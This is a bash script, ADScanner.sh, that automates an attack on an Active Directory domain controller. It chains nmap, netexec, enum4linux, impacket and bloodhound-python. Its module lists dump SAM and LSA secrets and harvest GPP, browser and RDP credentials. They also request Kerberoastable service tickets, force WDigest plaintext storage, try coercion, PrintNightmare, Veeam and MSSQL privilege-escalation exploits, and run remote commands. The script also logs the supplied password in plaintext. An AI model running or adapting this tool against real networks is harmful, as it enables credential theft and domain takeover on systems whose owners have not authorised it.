#!/usr/bin/env bash

# ========================================================================================
# ADScanner.sh - Active Directory Enumeration Script
# GNU Bash 5.2.37(1)-release compatible
# ========================================================================================

# ------------------------------------
# Global Variables and Defaults
# ------------------------------------
export SCRIPT_DIR="$(dirname "$0")"
export OUTPUT_DIR="$SCRIPT_DIR/tool_outputs"
mkdir -p "$OUTPUT_DIR"

LOG_FILE="$SCRIPT_DIR/ADScanner.log"
DATE_TIME="$(date +%Y%m%d_%H%M)"
REPORT_FILE="$SCRIPT_DIR/${DATE_TIME}_report.txt"

export IP=""
export USERNAME=""
export PASSWORD=""
export DOMAIN=""
export KDCHOST=""
export ADFQDN=""
export QUIET_MODE=false
export trueRoot=false
export OPEN_PORTS=""

# Load configuration if available
CONFIG_FILE="$SCRIPT_DIR/config.sh"
[[ -f "$CONFIG_FILE" ]] && source "$CONFIG_FILE"

# Default ports (can be overridden by config.sh)
SMB_PORTS="137,138,139,445"
LDAP_PORTS="389,636"
MSSQL_PORT="1433"
WINRM_PORTS="5985,5986"
KERBEROS_PORT="88"
SSH_PORT="22"
MYSQL_PORT="3306"
HTTP_PORT="80"
HTTPS_PORT="443"
NFS_PORT="2049"
FTP_PORT="21"

# ------------------------------------
# Ascii Art
# ------------------------------------
ascii_art() {
    # Define ANSI color codes
    local CYAN="\033[93m"
    local RESET="\033[0m"

    # Print the ASCII art in yellow
    echo -e "\n"
    echo -ne "${CYAN}"
    echo -ne "ICAgICAvXCAgIHwgIF9fIFwgLyBfX19ffCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIC8gIFwgIHwgfCAgfCB8IChfX18gICBfX18gX18gXyBfIF9fICBfIF9fICAgX19fIF8gX18gICAgICAgICAgICAKICAgLyAvXCBcIHwgfCAgfCB8XF9fXyBcIC8gX18vIF9gIHwgJ18gXHwgJ18gXCAvIF8gXCAnX198ICAgICAgICAgICAKICAvIF9fX18gXHwgfF9ffCB8X19fXykgfCAoX3wgKF98IHwgfCB8IHwgfCB8IHwgIF9fLyB8ICAgICAgICAgICAgICAKIC9fL19fX19cX1xfX19fXy98X19fX18vIFxfX19cX18sX3xffCB8X3xffCB8X3xcX19ffF98ICAgICAgICAgICAgICAKIHwgIF9fX198IHwgICAgICAgICAoXykgICAgICAgICAgIHwgfCAgfCB8ICAgICAgICAgIHwgfCAgICAgICAgICAgICAKIHwgfF9fICB8IHxfICAgXyBfX18gX19fICAgX19fX18gIHwgfF9ffCB8IF9fIF8gIF9fX3wgfCBfX19fXyBfIF9fICAKIHwgIF9ffCB8IHwgfCB8IC8gX198IFwgXCAvIC8gXyBcIHwgIF9fICB8LyBfYCB8LyBfX3wgfC8gLyBfIFwgJ19ffCAKIHwgfF9fX198IHwgfF98IFxfXyBcIHxcIFYgLyAgX18vIHwgfCAgfCB8IChffCB8IChfX3wgICA8ICBfXy8gfCAgICAKIHxfX19fX198X3xcX18sX3xfX18vX3wgXF8vIFxfX198IHxffCAgfF98XF9fLF98XF9fX3xffFxfXF9fX3xffCAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA=" | base64 -d
    echo -ne "${RESET}"
    echo -e "\n"
}

# ------------------------------------
# Logging Functions
# ------------------------------------
log() {
    local type="$1"
    local msg="$2"
    local timestamp="$(date '+%Y-%m-%d %H:%M:%S')"
    echo "[$timestamp] [$type] $msg" | tee -a "$LOG_FILE" >> "$REPORT_FILE"
}

append_to_report() {
    local section="$1"
    local message="$2"
    echo -e "\n---------- $section ----------" >> "$REPORT_FILE"
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] $message" >> "$REPORT_FILE"
}

# ------------------------------------
# Root Privilege Check
# ------------------------------------
check_root() {
    if [[ $(id -u) -ne 0 ]]; then
        log "ERROR" "Script must run as root. Use sudo."
        exit 1
    else
        export trueRoot=true
        [[ "$QUIET_MODE" = false ]] && echo "[+] SCRIPT IS RUNNING AS ROOT"
        log "INFO" "Script is running as root."
    fi
}

# ------------------------------------
# Argument Parsing
# ------------------------------------
parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -i)
                IP="$2"; shift 2;;
            -u)
                USERNAME="$2"; shift 2;;
            -p)
                PASSWORD="$2"; shift 2;;
            -d)
                DOMAIN="$2"; shift 2;;
            -k)
                KDCHOST="$2"; shift 2;;
            -f)
                ADFQDN="$2"; shift 2;;
            --quiet)
                QUIET_MODE=true; shift;;
            -h|--help|help)
                print_help;;
            *)
                log "ERROR" "Unknown argument: $1"
                print_help
                exit 1;;
        esac
    done

    # Validate IPv4 format
    if ! [[ "$IP" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        log "ERROR" "Invalid IPv4 format. Use xxx.xxx.xxx.xxx"
        exit 1
    fi

    export IP USERNAME PASSWORD DOMAIN KDCHOST ADFQDN
    log "INFO" "Inputs: IP=$IP USERNAME=$USERNAME PASSWORD=$PASSWORD DOMAIN=$DOMAIN KDCHOST=$KDCHOST ADFQDN=$ADFQDN"
}

print_help() {
    cat << EOF
Usage: $0 [options]

Active Directory Enumeration Script

Options:
  -i <IP>           Target IP address of the Domain Controller (required)
  -u <USERNAME>     Username for authentication (optional)
  -p <PASSWORD>     Password for authentication (optional)
  -d <DOMAIN>       Domain name e.g., example.local (optional)
  -k <KDCHOST>      KDC hostname for Kerberos authentication (required for kerberos)
  -f <ADFQDN>       AD FQDN required for Kerberos ticketing (required for kerberos)
  --quiet           Suppress most terminal output (optional)
  -h, --help        Show this help message and exit

Example:
  sudo ./ADScanner.sh -i 192.168.1.10 -u admin -p Passw0rd -d example.local -k dc.example.local -f example.local

EOF
    exit 0
}

# ------------------------------------
# Connectivity Check
# ------------------------------------
test_connectivity() {
    local host="$1"
    if ping -c 1 -W 2 "$host" > /dev/null 2>&1; then
        [[ "$QUIET_MODE" = false ]] && echo "[+] Host $host is reachable"
        append_to_report "Connectivity Check" "Host $host is reachable"
    else
        [[ "$QUIET_MODE" = false ]] && echo "[-] Host $host is not reachable"
        append_to_report "Connectivity Check" "Host $host is not reachable"
        log "ERROR" "Ping to $host failed"
        exit 1
    fi
}

# ------------------------------------
# Port Scanning
# ------------------------------------
scan_ports() {
    local portsTCP="$SMB_PORTS,$LDAP_PORTS,$MSSQL_PORT,$WINRM_PORTS,$KERBEROS_PORT,$SSH_PORT,$MYSQL_PORT,$HTTP_PORT,$HTTPS_PORT,$NFS_PORT,$FTP_PORT"
    log "INFO" "Scanning TCP ports: $portsTCP"
    nmap -sS -n -p "$portsTCP" "$IP" -oG "$OUTPUT_DIR/nmap.output" --open > "$OUTPUT_DIR/nmap_grepable_summary.output"
    local result=$(cat "$OUTPUT_DIR/nmap_grepable_summary.output")
    append_to_report "Port Scan" "$result"

    export OPEN_PORTS=$(grep -Po '\d+/open/tcp' "$OUTPUT_DIR/nmap.output" | cut -d '/' -f1 | paste -sd ',' -)
    log "INFO" "Open ports: $OPEN_PORTS"
    [[ -z "$OPEN_PORTS" ]] && log "WARNING" "No open ports detected. Nmap parsing may have failed."
}

# ------------------------------------
# Clock Synchronization
# ------------------------------------
sync_clock() {
    local ntp_tool="ntpdate"
    local ntp_port=123
    local max_attempts=3
    local attempt=1
    local output=""

    if ! command -v "$ntp_tool" >/dev/null 2>&1; then
        output="Error: $ntp_tool is not installed. Install it with 'sudo apt install ntp'."
        echo "[-] $output"
        append_to_report "Clock Synchronization" "$output"
        return 1
    fi

    if ! command -v nc >/dev/null 2>&1; then
        output="Error: netcat (nc) is not installed. Install it with 'sudo apt install netcat'."
        echo "[-] $output"
        append_to_report "Clock Synchronization" "$output"
        return 1
    fi

    if ! nc -z -u -w 2 "$IP" "$ntp_port" >/dev/null 2>&1; then
        output="Error: NTP port $ntp_port/UDP is not open on $IP. Time synchronization skipped."
        echo "[-] $output"
        append_to_report "Clock Synchronization" "$output"
        return 1
    fi

    local sudo_cmd=""
    if [ "$(id -u)" -ne 0 ]; then
        sudo_cmd="sudo"
        if ! command -v sudo >/dev/null 2>&1 || ! $sudo_cmd -n true 2>/dev/null; then
            output="Error: sudo is required for $ntp_tool but not available or not configured."
            echo "[-] $output"
            append_to_report "Clock Synchronization" "$output"
            return 1
        fi
    fi

    echo "[+] Synchronizing clock with $IP using $ntp_tool..."
    while [ $attempt -le $max_attempts ]; do
        output=$($sudo_cmd $ntp_tool "$IP" 2>&1)
        if [ $? -eq 0 ]; then
            output="Successfully synchronized clock with $IP.\n$output"
            echo "[+] $output"
            append_to_report "Clock Synchronization" "$output"
            return 0
        fi
        echo "[-] Attempt $attempt/$max_attempts failed: $output"
        sleep 2
        ((attempt++))
    done

    output="Error: Failed to synchronize clock with $IP after $max_attempts attempts.\nLast error: $output"
    echo "[-] $output"
    append_to_report "Clock Synchronization" "$output"
    return 1
}

# ------------------------------------
# Kerberos Configuration
# ------------------------------------
init_kerberos() {
    # Check if DOMAIN and ADFQDN are set
    if [[ -z "$DOMAIN" || -z "$ADFQDN" ]]; then
        log "ERROR" "DOMAIN or ADFQDN not set. Cannot initialize Kerberos configuration."
        return 1
    fi

    # Convert DOMAIN to uppercase for Kerberos realm (standard convention)
    local KERBEROS_REALM
    KERBEROS_REALM=$(echo "$DOMAIN" | tr '[:lower:]' '[:upper:]')

    # Backup existing krb5.conf if it exists
    if [[ -f "/etc/krb5.conf" ]]; then
        cp /etc/krb5.conf /etc/krb5.conf.bak
        log "INFO" "Backed up existing /etc/krb5.conf to /etc/krb5.conf.bak"
    fi

    # Write new krb5.conf
    log "INFO" "Writing Kerberos configuration to /etc/krb5.conf"
    cat > /etc/krb5.conf << EOF
[libdefaults]
    default_realm = $KERBEROS_REALM
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true

[realms]
    $KERBEROS_REALM = {
        kdc = $ADFQDN:88
        admin_server = $ADFQDN:749
        default_domain = $DOMAIN
    }

[domain_realm]
    .$DOMAIN = $KERBEROS_REALM
    $DOMAIN = $KERBEROS_REALM
EOF

    if [[ $? -eq 0 ]]; then
        log "INFO" "Successfully wrote /etc/krb5.conf with realm $KERBEROS_REALM and KDC $ADFQDN"
        append_to_report "Kerberos Configuration" "Initialized /etc/krb5.conf with realm $KERBEROS_REALM and KDC $ADFQDN"
        return 0
    else
        log "ERROR" "Failed to write /etc/krb5.conf"
        return 1
    fi
}

# ------------------------------------
# Active Directory Enumeration
# ------------------------------------

# Use netexec smb module to enumerate the Active Directory using Kerberos
execute_netexec_smb_kerberos() {
    if ! command -v netexec >/dev/null 2>&1; then
        log "ERROR" "netexec is not installed"
        return
    fi

    if [[ -z "$ADFQDN" || -z "$KDCHOST" ]]; then
        log "ERROR" "Skipping Kerberos netexec SMB test: ADFQDN or KDCHOST not provided"
        return
    fi

    if [[ "$OPEN_PORTS" == *"88"* ]]; then
        MODULES=(
            "--shares" # Get shares (low privs account)
            "--users" # Get users (low privs account)
            "--groups" # Get groups (low privs account)
            "--pass-pol" # Get password policy (low privs account)
            "--local-group" # Get local groups (low privs account)
            "--rid-brute" # Get groups and users (low privs account)
            "--delegate Administrator" #If you own a computer account try get local administrator with s4u2self extension
            "-M gpp_password" # Identify/extract passwords in Group Policy Preferences (GPP) files via SMB shares in AD
            "-M coerce_plus" # It attempts to force the target system to authenticate to a specified system
            "-M enum_av" # Used to enumerate antivirus (AV) software on a AD system
            "-M enum_ca" # Queries AD for CAs, with misconfigurations like vulnerable certificate templates.
            "-M gpp_autologin" # Extract autologin credentials in Group Policy Preferences (GPP) in Active Directory.
            "-M spooler" # Checks if AD is vulnerable to Print Spooler exploits.
            "-M printnightmare" # Check for printnightmare
            "-M webdav" # Checks for WebDAV vulnerabilities in AD.
            "-M veeam" # Exploit Veeam Backup & Replication servers in AD.
            "-M ms17-010" # Check for ms17-010
            "-M gpp_autologin" # Check GPP for creds
            "--sam" # Dump SAM passwords (High Priv)
            "--lsa" # Dump LSA passwords (High Priv)
            "--user $USERNAME"
            "-M firefox" # Get firefox creds.
            "-M powershell_history" # Get powershell history.
            "-M rdcman" # Get creds for RDP
            "-M wdigest" # Forces WDigest to store credentials in plaintext (if enabled).
        )
        for mod in "${MODULES[@]}"; do
            CMD="netexec smb -k '$ADFQDN'"
            [[ -n "$USERNAME" && -n "$PASSWORD" && -n "$DOMAIN" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD' -d '$DOMAIN' --kdcHost '$KDCHOST'"
            CMD+=" $mod"
            log "INFO" "Executing netexec with Kerberos: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_smb_kerberos.output"
            append_to_report "netexec SMB $mod" "$OUT"
        done
    else
        log "INFO" "Port 88 not open, skipping Kerberos netexec SMB execution."
    fi
}

# Use netexec smb module to enumerate the Active Directory using NTLM authentication
execute_netexec_smb_ntlm() {
    if ! command -v netexec >/dev/null 2>&1; then
        log "ERROR" "netexec is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"445"* ]]; then
        MODULES=(
            "--shares" # Get shares (low privs account)
            "--users" # Get users (low privs account)
            "--groups" # Get groups (low privs account)
            "--pass-pol" # Get password policy (low privs account)
            "--local-group" # Get local groups (low privs account)
            "--rid-brute" # Get groups and users (low privs account)
            "--delegate Administrator" #If you own a computer account try get local administrator with s4u2self extension
            "-M gpp_password" # Identify/extract passwords in Group Policy Preferences (GPP) files via SMB shares in AD
            "-M coerce_plus" # It attempts to force the target system to authenticate to a specified system
            "-M enum_av" # Used to enumerate antivirus (AV) software on a AD system
            "-M enum_ca" # Queries AD for CAs, with misconfigurations like vulnerable certificate templates.
            "-M gpp_autologin" # Extract autologin credentials in Group Policy Preferences (GPP) in Active Directory.
            "-M spooler" # Checks if AD is vulnerable to Print Spooler exploits.
            "-M printnightmare" # Check for printnightmare
            "-M webdav" # Checks for WebDAV vulnerabilities in AD.
            "-M veeam" # Exploit Veeam Backup & Replication servers in AD.
            "-M ms17-010" # Check for ms17-010
            "-M gpp_autologin" # Check GPP for creds
            "--sam" # Dump SAM passwords (High Priv)
            "--lsa" # Dump LSA passwords (High Priv)
            "--user $USERNAME"
            "-M firefox" # Get firefox creds.
            "-M powershell_history" # Get powershell history.
            "-M rdcman" # Get creds for RDP
            "-M wdigest" # Forces WDigest to store credentials in plaintext (if enabled).
        )
        for mod in "${MODULES[@]}"; do
            CMD="netexec smb '$IP'"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD' -d '$DOMAIN'"
            CMD+=" $mod"
            log "INFO" "Executing netexec with NTLM: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_smb_ntlm.output"
            append_to_report "netexec SMB $mod" "$OUT"
        done
    fi
}

# Use netexec ldap module to enumerate the Active Directory
execute_netexec_ldap() {
    if ! command -v netexec >/dev/null 2>&1; then
        log "ERROR" "netexec is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"389"* || "$OPEN_PORTS" == *"636"* ]]; then
        MODULES=(
            "-M adcs" # Check for certificate authorities
            "-M enum_trusts"
            "-M get-desc-users" # Search for passwords in user description (low priv)
            "-M get-network"
            "-M get-unixUserPassword" # Search for passwords unix joined systems
            "-M get-userPassword" # Search for passwords 
            "-M groupmembership -o USER=$USERNAME"
            "-M laps" # Check for LAPS READ policy
            "-M ldap-checker"
            "-M pso" # Get password policy and spray
            "-M subnets"
            "-M user-desc" # Search for passwords in user description (low priv)
            "-M whoami"
            "-M daclread -o TARGET=Administrator ACTION=read"
        )
        for mod in "${MODULES[@]}"; do
            CMD="netexec ldap '$IP'"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD'"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_ldap.output"
            append_to_report "netexec ldap $mod" "$OUT"
        done
    fi
}

# Use netexec winrm module to enumerate the Active Directory
execute_netexec_winrm() {
    if ! command -v netexec >/dev/null 2>&1; then
        log "ERROR" "netexec is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"5985"* || "$OPEN_PORTS" == *"5986"* ]]; then
        MODULES=(" ")
        for mod in "${MODULES[@]}"; do
            CMD="netexec winrm '$IP'"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD'"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_winrm.output"
            append_to_report "netexec winrm $mod" "$OUT"
        done
    fi
}

# Use netexec mssql module to enumerate the Active Directory
execute_netexec_mssql() {
    if ! command -v netexec >/dev/null 2>&1; then
        log "ERROR" "netexec is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"1433"* ]]; then
        MODULES=(
            " "
            "--local-auth"
            "--local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'"
            "--local-auth -x whoami"
            "--rid-brute"
            "-M mssql_priv -o ACTION=privesc"
        )
        for mod in "${MODULES[@]}"; do
            CMD="netexec mssql '$IP'"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD'"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_mssql.output"
            append_to_report "netexec mssql $mod" "$OUT"
        done
    fi
}

# Use netexec ssh module to enumerate the Active Directory
execute_netexec_ssh() {
    if ! command -v netexec >/dev/null 2>&1; then
        log "ERROR" "netexec is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"22"* ]]; then
        MODULES=(
            " "
            "--local-auth"
            "-x whoami"
        )
        for mod in "${MODULES[@]}"; do
            CMD="netexec ssh '$IP'"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD'"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_ssh.output"
            append_to_report "netexec ssh $mod" "$OUT"
        done
    fi
}

# Use netexec ftp module to enumerate the Active Directory
execute_netexec_ftp() {
    if ! command -v netexec >/dev/null 2>&1; then
        log "ERROR" "netexec is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"21"* ]]; then
        MODULES=(
            " "
            "--local-auth"
            "--ls"
        )
        for mod in "${MODULES[@]}"; do
            CMD="netexec ftp '$IP'"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD'"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_ftp.output"
            append_to_report "netexec ftp $mod" "$OUT"
        done
    fi
}

# Use enum4linux to enumerate the Active Directory (This is for old version for AD 2019 and upwards is not going to work)
execute_enum4linux() {
    if ! command -v enum4linux >/dev/null 2>&1; then
        log "ERROR" "enum4linux is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"445"* ]]; then
        MODULES=("-a")
        for mod in "${MODULES[@]}"; do
            CMD="enum4linux '$IP'"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD'"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/enum4linux.output"
            append_to_report "enum4linux $mod" "$OUT"
        done
    fi
}

# Use enum4linux-ng to enumerate the Active Directory (This is for newer versions of AD)
execute_enum4linux-ng() {
    if ! command -v enum4linux-ng >/dev/null 2>&1; then
        log "ERROR" "enum4linux-ng is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"445"* ]]; then
        MODULES=(" ")
        for mod in "${MODULES[@]}"; do
            CMD="enum4linux-ng '$IP'"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD'"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/enum4linux-ng.output"
            append_to_report "enum4linux-ng $mod" "$OUT"
        done
    fi
}

# Use impacket-GetUserSPNs to enumerate the Active Directory
execute_impacket_getuserspns() {
    if ! command -v impacket-GetUserSPNs >/dev/null 2>&1; then
        log "ERROR" "impacket-GetUserSPNs is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"445"* || "$OPEN_PORTS" == *"88"* ]]; then
        CMD="impacket-GetUserSPNs '$DOMAIN/$USERNAME:$PASSWORD' -dc-ip '$IP' -request"
        log "INFO" "Executing: $CMD"
        OUT=$(eval "$CMD" 2>&1)
        echo "$OUT" >> "$OUTPUT_DIR/impacket_getuserspns.output"
        append_to_report "impacket-GetUserSPNs" "$OUT"
    fi
}

# Use impacket-getTGT to get ticket for Active Directory
execute_impacket_getTGT() {
    if ! command -v impacket-getTGT >/dev/null 2>&1; then
        log "ERROR" "impacket-getTGT is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"88"* ]]; then
        CMD="impacket-getTGT '$DOMAIN/$USERNAME:$PASSWORD' -dc-ip '$IP'"
        log "INFO" "Executing: $CMD"
        OUT=$(eval "$CMD" 2>&1)
        echo "$OUT" >> "$OUTPUT_DIR/impacket-getTGT.output"
        append_to_report "impacket-getTGT" "$OUT"
    fi
}

# Use bloodhound remote collector for analysis of permissions
execute_bloodhound_python() {
    if ! command -v bloodhound-python >/dev/null 2>&1; then
        log "ERROR" "bloodhound-python is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"389"* || "$OPEN_PORTS" == *"445"* || "$OPEN_PORTS" == *"88"* ]]; then
        CMD="bloodhound-python -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' -c All -dc $ADFQDN -ns $IP -gc $ADFQDN"
        log "INFO" "Executing: $CMD"
        OUT=$(eval "$CMD" 2>&1)
        echo "$OUT" >> "$OUTPUT_DIR/bloodhound_python.output"
        append_to_report "bloodhound-python" "$OUT"
    fi
}

# Use ldapsearch for AD enumeration
execute_ldapsearch() {
    if ! command -v ldapsearch >/dev/null 2>&1; then
        log "ERROR" "ldapsearch is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"389"* || "$OPEN_PORTS" == *"636"* ]]; then
        SEARCHES=(
            "'(objectClass=user)' sAMAccountName cn userPrincipalName memberOf"
            "'(objectClass=group)' sAMAccountName cn member"
            "'(objectClass=computer)' sAMAccountName cn dNSHostName operatingSystem"
            "'(servicePrincipalName=*)' sAMAccountName servicePrincipalName"
            "'(objectClass=organizationalUnit)' name description"
            "'(adminCount=1)' sAMAccountName cn memberOf"
            "-x -s base namingcontexts"
            "-x -b 'DC=${DOMAIN//./,DC=}'"
        )
        for search in "${SEARCHES[@]}"; do
            CMD="ldapsearch -x -H ldap://$IP -D '$USERNAME@$DOMAIN' -w '$PASSWORD' -b 'DC=${DOMAIN//./,DC=}'"
            [[ -n "$search" ]] && CMD+=" $search"
            log "INFO" "Executing: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/ldapsearch.output"
            append_to_report "ldapsearch $search" "$OUT"
        done
    fi
}

# ------------------------------------
# Main Execution
# ------------------------------------
main() {
    ascii_art
    parse_args "$@"
    check_root
    test_connectivity "$IP"
    scan_ports
    sync_clock
    # Initialize Kerberos configuration before any Kerberos-dependent operations
    init_kerberos
    # Enum all AD
    execute_enum4linux
    execute_enum4linux-ng
    # Targeted enum of AD
    execute_netexec_smb_ntlm
    execute_netexec_smb_kerberos
    execute_netexec_winrm
    execute_netexec_ldap
    execute_netexec_mssql
    execute_netexec_ssh
    execute_netexec_ftp
    execute_ldapsearch
    execute_impacket_getuserspns
    execute_impacket_getTGT
    execute_bloodhound_python
}

main "$@"
